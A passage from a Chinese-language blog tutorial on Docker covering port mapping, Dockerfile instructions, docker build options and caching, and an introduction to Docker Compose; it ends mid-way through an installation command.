app.py</span></span><br></pre></td></tr></table></figure><p>此时默认会绑定本地所有接口上的所有地址。</p><p><strong>映射到指定地址的指定端口</strong></p><p>可以使用 <code>ip:hostPort:containerPort</code> 格式指定映射使用一个特定地址，比如 localhost 地址 127.0.0.1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py</span></span><br></pre></td></tr></table></figure><p><strong>映射到指定地址的任意端口</strong></p><p>使用 <code>ip::containerPort</code> 绑定 localhost 的任意端口到容器的 5000 端口，本地主机会自动分配一个端口。</p><p>$ docker run -d -p 127.0.0.1::5000 training/webapp python app.py</p><p>还可以使用 <code>udp</code> 标记来指定 <code>udp</code> 端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py</span></span><br></pre></td></tr></table></figure><p><strong>查看映射端口配置</strong></p><p>使用 <code>docker port</code> 来查看当前映射的端口配置，也可以查看到绑定的地址</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker port nostalgic_morse <span class="number">5000</span></span><br><span class="line"><span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">49155</span>.</span><br></pre></td></tr></table></figure><blockquote><p>注意：<br>容器有自己的内部网络和 ip 地址（使用 docker inspect 可以获取所有的变量，Docker 还可以有一个可变的网络配置。）<br>-p 标记可以多次使用来绑定多个端口</p></blockquote><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d \</span><br><span class="line">    -<span class="ruby">p <span class="number">5000</span><span class="symbol">:</span><span class="number">5000</span> \</span></span><br><span class="line"><span class="ruby">    -p <span class="number">3000</span><span class="symbol">:</span><span class="number">80</span> \</span></span><br><span class="line"><span class="ruby">    training/webapp \</span></span><br><span class="line"><span class="ruby">    python app.py</span></span><br></pre></td></tr></table></figure><p>可以查看容器的具体IP地址，如果输出是空的说明没有配置IP地址<br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker </span><span class="string">inspect </span><span class="built_in">--format</span> <span class="string">'&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;'</span> 容器<span class="string">id</span></span><br></pre></td></tr></table></figure></p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><h3 id="Dockerfile概念"><a href="#Dockerfile概念" class="headerlink" title="Dockerfile概念"></a>Dockerfile概念</h3><p>前面我们已经提到了 Docker 的一些基本概念。以 <code>CTF 选手</code>的角度来看，我们可以去使用 Dockerfile 定义镜像，依赖镜像来运行容器，可以去模拟出一个真实的漏洞场景。因此毫无疑问的说， Dockerfile 是镜像和容器的关键，并且 Dockerfile 还可以很轻易的去定义镜像内容，说了这么多，那么 Dockerfile 到底是个什么东西呢？</p><p>Dockerfile 是自动构建 docker 镜像的配置文件， 用户可以使用 Dockerfile 快速创建自定义的镜像。Dockerfile 中的命令非常类似于 linux 下的 shell 命令。</p><p>我们可以通过下面这幅图来直观地感受下 Docker 镜像、容器和 Dockerfile 三者之间的关系。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566372613804.png" alt></p><p>我们从上图中可以看到， Dockerfile 可以自定义镜像，通过 Docker 命令去运行镜像，从而达到启动容器的目的。</p><p>Dockerfile 是由一行行命令语句组成，并且支持已 <code>#</code> 开头的注释行。</p><p>一般来说，我们可以将 Dockerfile 分为四个部分：</p><ul><li>基础镜像(父镜像)信息指令 FROM</li><li>维护者信息指令 MAINTAINER</li><li>镜像操作指令 RUN 、 EVN 、 ADD 和 WORKDIR 等</li><li>容器启动指令 CMD 、 ENTRYPOINT 和 USER 等</li></ul><h3 id="Dockerfile文件格式"><a href="#Dockerfile文件格式" class="headerlink" title="Dockerfile文件格式"></a>Dockerfile文件格式</h3><p>下面是一段简单的Dockerfile的例子：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">2.7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> QYMUA &lt;qymuao3o@gmail.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . /app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install -r requirements.txt</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"python"</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"app.py"</span>]</span></span><br></pre></td></tr></table></figure><ol><li>从 Docker Hub 上 pull 下 python 2.7 的基础镜像</li><li>显示维护者的信息</li><li><code>copy</code> 当前目录到容器中的 <code>/app</code> 目录下 复制本地主机的 <code>&lt;src&gt;</code> ( <code>Dockerfile</code> 所在目录的相对路径)到容器里 <code>&lt;dest&gt;</code></li><li>指定工作路径为 <code>/app</code></li><li>安装依赖包</li><li>暴露 <code>5000</code> 端口</li><li>启动 <code>app</code></li></ol><p>这个例子是启动一个 <code>python flask app</code> 的 <code>Dockerfile</code> ( <code>flask</code> 是 <code>python</code> 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</p><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>docker build 命令会根据 Dockerfile 文件及上下文构建新 Docker 镜像。构建上下文是指 Dockerfile 所在的<code>本地路径</code>或一个<code>URL（Git仓库地址）</code>。构建上下文环境会被递归处理，所以构建所指定的路径还包括了子目录，而URL还包括了其中指定的子模块。</p><p>将当前目录做为构建上下文时，可以像下面这样使用docker build命令构建镜像：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">build </span>.</span><br><span class="line">Sending <span class="keyword">build </span><span class="built_in">context</span> to Docker daemon  <span class="number">6</span>.<span class="number">51</span> MB</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>说明：构建会在 Docker 后台守护进程（daemon）中执行，而不是CLI中。构建前，构建进程会将全部内容（递归）发送到守护进程。大多情况下，应该将一个空目录作为构建上下文环境，并将 Dockerfile 文件放在该目录下。</p><p>在构建上下文中使用的 Dockerfile 文件，是一个构建指令文件。为了提高构建性能，可以通过<code>.dockerignore</code>文件排除上下文目录下不需要的文件和目录。</p><p>在 Docker 构建镜像的第一步，docker CLI 会先在上下文目录中寻找<code>.dockerignore</code>文件，根据<code>.dockerignore</code> 文件排除上下文目录中的部分文件和目录，然后把剩下的文件和目录传递给 Docker 服务。</p><p>Dockerfile 一般位于构建上下文的根目录下，也可以通过-f指定该文件的位置：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">build</span> -f /<span class="keyword">path</span>/<span class="keyword">to</span>/a/Dockerfile .</span><br></pre></td></tr></table></figure><p>构建时，还可以通过-t参数指定构建成镜像的仓库、标签。</p><h3 id="镜像标签"><a href="#镜像标签" class="headerlink" title="镜像标签"></a>镜像标签</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">build </span>-t nginx/<span class="built_in">v3</span> .</span><br></pre></td></tr></table></figure><p>如果存在多个仓库下，或使用多个镜像标签，就可以使用多个-t参数：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">build </span>-t nginx/<span class="built_in">v3</span>:<span class="number">1</span>.<span class="number">0</span>.<span class="number">2</span> -t nginx/<span class="built_in">v3</span>:latest .</span><br></pre></td></tr></table></figure><p>在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t nginx/v3 .</span><br><span class="line">Sending build context to Docker daemon 2.048 kB</span><br><span class="line"><span class="keyword">Error </span>response from daemon: Unknown instruction: RUNCMD</span><br></pre></td></tr></table></figure><p><strong>其它 docker build 的用法</strong></p><p><code>直接用 Git repo 进行构建</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker build http<span class="variable">s:</span>//github.<span class="keyword">com</span>/twang2218/gitlab-<span class="keyword">ce</span>-zh.git#:<span class="number">11.1</span></span><br><span class="line"></span><br><span class="line">Sending build context <span class="keyword">to</span> Docker daemon <span class="number">2.048</span> kB</span><br><span class="line">Step <span class="number">1</span> : FROM gitlab/gitlab-<span class="keyword">ce</span>:<span class="number">11.1</span>.<span class="number">0</span>-<span class="keyword">ce</span>.<span class="number">0</span></span><br><span class="line"><span class="number">11.1</span>.<span class="number">0</span>-<span class="keyword">ce</span>.<span class="number">0</span>: Pulling from gitlab/gitlab-<span class="keyword">ce</span></span><br><span class="line">aed15891ba52: Already <span class="built_in">exists</span></span><br><span class="line"><span class="number">773</span>ae8583d14: Already <span class="built_in">exists</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这行命令指定了构建所需的 Git repo，并且指定默认的 master 分支，构建目录为 <code>/11.1/</code>，然后 Docker 就会自己去 git clone 这个项目、切换到指定分支、并进入到指定目录后开始构建。</p><p><code>用给定的 tar 压缩包构建</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> docker build http:<span class="comment">//server/context.tar.gz</span></span><br></pre></td></tr></table></figure><p>如果所给出的 URL 不是个 Git repo，而是个 <code>tar</code> 压缩包，那么 Docker 引擎会下载这个包，并自动解压缩，以其作为上下文，开始构建。</p><p><code>从标准输入中读取 Dockerfile 进行构建</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">build</span> - &lt; Dockerfile <span class="keyword">or</span> cat Dockerfile | docker <span class="keyword">build</span> -</span><br></pre></td></tr></table></figure><p>如果标准输入传入的是文本文件，则将其视为 Dockerfile，并开始构建。这种形式由于直接从标准输入中读取 <code>Dockerfile</code> 的内容，它没有上下文，因此不可以像其他方法那样可以将本地文件 <code>COPY</code> 进镜像之类的事情。</p><p><code>从标准输入中读取上下文压缩包进行构建</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build - &lt; context<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure><p>如果发现标准输入的文件格式是 <code>gzip</code>、<code>bzip2</code> 以及 <code>xz</code> 的话，将会使其为上下文压缩包，直接将其展开，将里面视为上下文，并开始构建。</p><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>Docker 守护进程会一条一条的执行 Dockerfile 中的指令，而且会在每一步提交并生成一个新镜像，最后会输出最终镜像的ID。生成完成后，Docker 守护进程会自动清理你发送的上下文。 Dockerfile文件中的每条指令会被独立执行，并会创建一个新镜像，<code>RUN cd /tmp</code>等命令不会对下条指令产生影响。 Docker 会重用已生成的中间镜像，以加速docker build的构建速度。以下是一个使用了缓存镜像的执行过程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker build -t svendowideit/ambassador .</span></span><br><span class="line">Sending build context to Docker daemon 15.36 kB</span><br><span class="line">Step 1/4 : FROM alpine:3.2</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 31f630c65071</span></span><br><span class="line">Step 2/4 : MAINTAINER SvenDowideit@home.org.au</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 2a1c91448f5f</span></span><br><span class="line">Step 3/4 : RUN apk update &amp;&amp;      apk add socat &amp;&amp;        rm -r /var/cache/</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 21ed6e7fbb73</span></span><br><span class="line">Step 4/4 : CMD env | grep _TCP= | (sed 's/.*_PORT_\([0-9]*\)_TCP=tcp:\/\/\(.*\):\(.*\)/socat -t 100000000 TCP4-LISTEN:\1,fork,reuseaddr TCP4:\2:\3 \&amp;/' &amp;&amp; echo wait) | sh</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 7ea8aef582cc</span></span><br><span class="line">Successfully built 7ea8aef582cc</span><br></pre></td></tr></table></figure><p>构建缓存仅会使用本地父生成链上的镜像，如果不想使用本地缓存的镜像，也可以通过<code>--cache-from</code>指定缓存。指定后将不再使用本地生成的镜像链，而是从镜像仓库中下载。</p><h3 id="寻找缓存的逻辑"><a href="#寻找缓存的逻辑" class="headerlink" title="寻找缓存的逻辑"></a>寻找缓存的逻辑</h3><p>Docker 寻找缓存的逻辑其实就是树型结构根据 Dockerfile 指令遍历子节点的过程。下图可以说明这个逻辑。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> FROM base_image:<span class="keyword">version</span>           Dockerfile:</span><br><span class="line">           +----------+                FROM base_image:<span class="keyword">version</span></span><br><span class="line">           |base image|                <span class="keyword">RUN</span> cmd1  --&gt; <span class="keyword">use</span> cache because we found base image</span><br><span class="line">           +-----X----+                <span class="keyword">RUN</span> cmd11 --&gt; <span class="keyword">use</span> cache because we found cmd1</span><br><span class="line">                / \</span><br><span class="line">               /   \</span><br><span class="line">       <span class="keyword">RUN</span> cmd1     <span class="keyword">RUN</span> cmd2           Dockerfile:</span><br><span class="line">       +------+     +------+           FROM base_image:<span class="keyword">version</span></span><br><span class="line">       |image1|     |image2|           <span class="keyword">RUN</span> cmd2  --&gt; <span class="keyword">use</span> cache because we found base image</span><br><span class="line">       +---X--+     +------+           <span class="keyword">RUN</span> cmd21 --&gt; not <span class="keyword">use</span> cache because there's <span class="keyword">no</span> child node</span><br><span class="line">          / \                                        running cmd21, <span class="keyword">so</span> we build a new image here</span><br><span class="line">         /   \</span><br><span class="line"><span class="keyword">RUN</span> cmd11     <span class="keyword">RUN</span> cmd12</span><br><span class="line">+-------+     +-------+</span><br><span class="line">|image11|     |image12|</span><br><span class="line">+-------+     +-------+</span><br></pre></td></tr></table></figure><p>大部分指令可以根据上述逻辑去寻找缓存，除了 ADD 和 COPY 。这两个指令会复制文件内容到镜像内，除了指令相同以外，Docker 还会检查每个文件内容校验(不包括最后修改时间和最后访问时间)，如果校验不一致，则不会使用缓存。</p><p>除了这两个命令，Docker 并不会去检查容器内的文件内容，比如 <code>RUN apt-get -y update</code>，每次执行时文件可能都不一样，但是 Docker 认为命令一致，会继续使用缓存。这样一来，以后构建时都不会再重新运行apt-get -y update。</p><p>如果 Docker 没有找到当前指令的缓存，则会构建一个新的镜像，并且之后的所有指令都不会再去寻找缓存。</p><h3 id="修改容器内容"><a href="#修改容器内容" class="headerlink" title="修改容器内容"></a>修改容器内容</h3><p>容器启动后，需要对容器内的文件进行进一步的完善，可以使用docker exec -it xx bash命令再次进行修改，以上面的示例为基础，修改 nginx 启动页面内容：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it docker_nginx_v1   bash</span><br><span class="line">root<span class="variable">@3729b97e8226</span><span class="symbol">:/</span><span class="comment"># echo '&lt;h1&gt;Hello, Docker neo!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.html</span></span><br><span class="line">root<span class="variable">@3729b97e8226</span><span class="symbol">:/</span><span class="comment"># exit</span></span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>以交互式终端方式进入 docker_nginx_v1 容器，并执行了 bash 命令，也就是获得一个可操作的 Shell。</p><p>修改了容器的文件，也就是改动了容器的存储层，可以通过 docker diff 命令看到具体的改动</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker diff docker_nginx_v1 </span><br><span class="line"><span class="keyword">...</span></span><br></pre></td></tr></table></figure><h3 id="Dockerfile常用指令"><a href="#Dockerfile常用指令" class="headerlink" title="Dockerfile常用指令"></a>Dockerfile常用指令</h3><p>根据上面的例子，我们已经差不多知道了Dockerfile的组成以及指令的编写过程，我们再来理解一下这些常用命令就会得心应手了。</p><p>由于 <code>Dockerfile</code> 中所有的命令都是以下格式：<code>INSTRUCTION argument</code> ，指令 <code>(INSTRUCTION)</code> 不分大小写，但是推荐大写，和sql语句是不是很相似呢？下面我们正式来讲解一下这些指令集吧。</p><p><strong>FROM</strong></p><p><code>FROM</code> 是用于指定基础的 <code>images</code> ，一般格式为 <code>FROM &lt;image&gt;</code> or <code>FORM &lt;image&gt;:&lt;tag&gt;</code> ，所有的 <code>Dockerfile</code> 都用该以 <code>FROM</code> 开头，<code>FROM</code> 命令指明 <code>Dockerfile</code> 所创建的镜像文件以什么镜像为基础，<code>FROM</code> 以后的所有指令都会在 <code>FROM</code> 的基础上进行创建镜像。可以在同一个 <code>Dockerfile</code> 中多次使用 <code>FROM</code> 命令用于创建多个镜像。比如我们要指定 <code>python 2.7</code> 的基础镜像，我们可以像如下写法一样：</p><figure class="highlight ruleslanguage"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">2.7</span></span><br></pre></td></tr></table></figure><p><strong>MAINTAINER</strong></p><p>MAINTAINER 是用于指定镜像创建者和联系方式，一般格式为 <code>MAINTAINER &lt;name&gt;</code> 。这里我设置成我的 ID 和邮箱：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">MAINTAINER</span> <span class="selector-tag">QYMUA</span> &lt;<span class="selector-tag">qymuao3o</span>@<span class="keyword">gmail</span>.<span class="keyword">com</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>COPY</strong></p><p>COPY 是用于复制本地主机的 <code>&lt;src&gt;</code> (为 Dockerfile 所在目录的相对路径)到容器中的 <code>&lt;dest&gt;</code>。</p><p>当使用本地目录为源目录时，推荐使用 COPY 。一般格式为 <code>COPY &lt;src&gt;&lt;dest&gt;</code> 。例如我们要拷贝当前目录到容器中的 /app 目录下，我们可以这样操作：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> . /app</span></span><br></pre></td></tr></table></figure><p>和 RUN 指令一样，也有两种格式，一种类似于命令行，一种类似于函数调用=&gt;<code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]</code></p><p><strong>ADD(更高级的复制文件)</strong></p><p>ADD 指令和 COPY 的格式和性质基本一致。但是在 COPY 基础上增加了一些功能。</p><p>比如 <code>&lt;源路径&gt;</code> 可以是一个 URL，这种情况下，Docker 引擎会试图去下载这个链接的文件放到 &lt;目标路径&gt; 去。下载后的文件权限自动设置为 600，如果这并不是想要的权限，那么还需要增加额外的一层 RUN 进行权限调整，另外，如果下载的是个压缩包，需要解压缩，也一样还需要额外的一层 RUN 指令进行解压缩。所以不如直接使用 RUN 指令，然后使用 wget 或者 curl 工具下载，处理权限、解压缩、然后清理无用文件更合理。因此，这个功能其实并不实用，而且不推荐使用。</p><p>另外需要注意的是，ADD 指令会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。</p><p>因此在 COPY 和 ADD 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 COPY 指令，仅在需要自动解压缩的场合使用 ADD。</p><p><strong>WORKDIR</strong></p><p>WORKDIR 用于配合 RUN，CMD，ENTRYPOINT 命令设置当前工作路径。可以设置多次，如果是相对路径，则相对前一个 WORKDIR 命令。默认路径为/。一般格式为 <code>WORKDIR /path/to/work/dir</code> 。例如我们设置/app 路径，我们可以进行如下操作：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br></pre></td></tr></table></figure><p><strong>RUN</strong></p><p><code>RUN</code> 用于容器内部执行命令。每个 <code>RUN</code> 命令相当于在原有的镜像基础上添加了一个改动层，原有的镜像不会有变化。shell格式为 <code>RUN &lt;command&gt;</code> 。例如我们要安装 python 依赖包，我们做法如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install -r requirements.txt</span></span><br></pre></td></tr></table></figure><p>exec 格式：<code>RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</code>，这更像是函数调用中的格式。</p><p>Dockerfile 中每一个指令都会建立一层，RUN 也不例外。每一个 RUN 的行为，就和刚才我们手工建立镜像的过程一样：新建立一层，在其上执行这些命令，执行结束后，commit 这一层的修改，构成新的镜像。</p><p><strong>EXPOSE</strong></p><p>EXPOSE 命令用来指定对外开放的端口。一般格式为 <code>EXPOSE &lt;port&gt; [&lt;port&gt;...]</code></p><p>例如上面那个例子，开放5000端口：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE <span class="number">5000</span></span><br></pre></td></tr></table></figure><p><strong>ENTRYPOINT</strong></p><p>ENTRYPOINT 可以让你的容器表现得像一个可执行程序一样。一个 Dockerfile 中只能有一个 ENTRYPOINT，如果有多个，则最后一个生效。</p><p>ENTRYPOINT 命令也有两种格式：</p><ul><li>ENTRYPOINT [“executable”, “param1”, “param2”] ：推荐使用的 exec形式</li><li>ENTRYPOINT command param1 param2 ：shell 形式</li></ul><p>例如下面这个，我们要将 python 镜像变成可执行的程序，我们可以这样去做：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"python"</span>]</span></span><br></pre></td></tr></table></figure><p><strong>CMD</strong></p><p>CMD 命令用于启动容器时默认执行的命令，CMD 命令可以包含可执行文件，也可以不包含可执行文件。不包含可执行文件的情况下就要用 ENTRYPOINT 指定一个，然后 CMD 命令的参数就会作为ENTRYPOINT的参数。</p><p>CMD 命令有三种格式：</p><ul><li>CMD [“executable”,”param1”,”param2”]：推荐使用的 exec 形式。</li><li>CMD [“param1”,”param2”]：无可执行程序形式</li><li>CMD command param1 param2：shell 形式。</li></ul><p>一个 Dockerfile 中只能有一个CMD，如果有多个，则最后一个生效。而 CMD 的 shell 形式默认调用 /bin/sh -c 执行命令。</p><p>CMD 命令会被 Docker 命令行传入的参数覆盖：<code>docker run busybox /bin/echo Hello</code> Docker 会把 CMD 里的命令覆盖。</p><p>例如我们要启动 <code>/app</code> ，我们可以用如下命令实现：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"app.py"</span>]</span></span><br></pre></td></tr></table></figure><h2 id="Docker三剑客之Compose项目"><a href="#Docker三剑客之Compose项目" class="headerlink" title="Docker三剑客之Compose项目"></a>Docker三剑客之Compose项目</h2><h3 id="了解docker三剑客"><a href="#了解docker三剑客" class="headerlink" title="了解docker三剑客"></a>了解docker三剑客</h3><p><strong>docker-machine是解决docker运行环境问题</strong>。</p><p>docker技术是基于Linux内核的cgroup技术实现的，那么问题来了，如果在非Linux平台上使用docker技术需要依赖安装Linux系统的虚拟机。docker-machine就是docker公司官方提出的，用于在各种平台上快速创建具有docker服务的虚拟机的技术。你可以把它理解为virtualbox或者vmware，最开始在win7上用得比较多，但是win10开始自带了hyper-v虚拟机，已经不再需要docker-machine了，docker可以直接运行在安装了Linux系统得hyper-v上。</p><p><strong>dcoker-compose主要是解决本地docker容器编排问题。</strong></p><p>一般是通过YAML配置文件来使用它，这个YAML文件里能记录多个容器启动的配置信息（镜像、启动命令、端口映射等），最后只需要执行docker-compose对应的命令就会像执行脚本一样地批量创建和销毁容器。</p><p><strong>docker-swarmdocker-swarm是解决多主机多个容器调度部署得问题。</strong></p><p>swarm是基于docker平台实现的集群技术，他可以通过几条简单的指令快速的创建一个docker集群，接着在集群的共享网络上部署应用，最终实现分布式的服务。swarm技术相当不成熟，很多配置功能都无法实现，只能说是个半成品，目前更多的是使用Kubernetes来管理集群和调度容器。</p><h3 id="dockerfile与docker-compose的区别"><a href="#dockerfile与docker-compose的区别" class="headerlink" title="dockerfile与docker-compose的区别"></a>dockerfile与docker-compose的区别</h3><p>简单总结：</p><ol><li>dockerfile: 构建镜像；</li><li>docker run: 启动容器；</li><li>docker-compose: 启动服务；</li></ol><p>简而言之， Dockerfile 可以让用户管理一个单独的应用容器；而 Compose 则允许用户在一个单独的docker-compose.yml模板文件（YAML 格式）中定义一组相关联的应用容器（被称为一个 project，即项目），例如一个 Web 服务容器再加上后端的数据库服务容器等。</p><h3 id="Docker-Compose-介绍"><a href="#Docker-Compose-介绍" class="headerlink" title="Docker Compose 介绍"></a>Docker Compose 介绍</h3><p>Docker-Compose 是 Docker 的一种编排服务，是一个用于在 Docker 上定义并运行复杂应用的工具，可以让用户在集群中部署分布式应用。</p><p>通过 Docker-Compose 用户可以很容易地用一个配置文件定义一个多容器的应用，然后使用一条指令安装这个应用的所有依赖，完成构建。Docker-Compose 解决了容器与容器之间如何管理编排的问题。</p><p>Docker Compose 工作原理图</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566383445280.png" alt></p><p>Compose 中有两个重要的概念：</p><ul><li>服务 (service) ：一个应用的容器，实际上可以包括若干运行相同镜像的容器实例。</li><li>项目 (project) ：由一组关联的应用容器组成的一个完整业务单元，在 docker-compose.yml 文件中定义。</li></ul><p>一个项目可以由多个服务（容器）关联而成，Compose 面向项目进行管理，通过子命令对项目中的一组容器进行便捷地生命周期管理。</p><p>Compose 项目由 Python 编写，实现上调用了 Docker 服务提供的 API 来对容器进行管理。因此，只要所操作的平台支持 Docker API，就可以在其上利用 Compose 来进行编排管理。</p><h3 id="安装与卸载"><a href="#安装与卸载" class="headerlink" title="安装与卸载"></a>安装与卸载</h3><p><code>Compose</code> 支持 Linux、macOS、Windows 10 三大平台。</p><p><code>Compose</code> 可以通过 Python 的包管理工具 <code>pip</code> 进行安装，也可以直接下载编译好的二进制文件使用，甚至能够直接在 Docker 容器中运行。</p><p>前两种方式是传统方式，适合本地环境下安装使用；最后一种方式则不破坏系统环境，更适合云计算场景。</p><p><code>Docker for Mac</code> 、<code>Docker for Windows</code> 自带 <code>docker-compose</code> 二进制文件，安装 Docker 之后可以直接使用。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># docker-compose --version</span><br><span class="line">docker-compose version <span class="number">1.24</span><span class="number">.1</span>, build <span class="number">4667896</span>b</span><br></pre></td></tr></table></figure><p><strong>二进制包</strong></p><p>在 Linux 上的也安装十分简单，从 官方 GitHub Release 处直接下载编译好的二进制文件即可。</p><p>例如，在 Linux 64 位系统上直接下载对应的二进制包。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo curl -L <span class="symbol">https:</span>/<span class="regexp">/github.com/docker</span><span class="regexp">/compose/releases</span><span class="regexp">/download/</span><span class="number">1.17</span>.<span class="number">1</span>/docker-compose-<span class="string">`uname -s`</span>-<span class="string">`uname 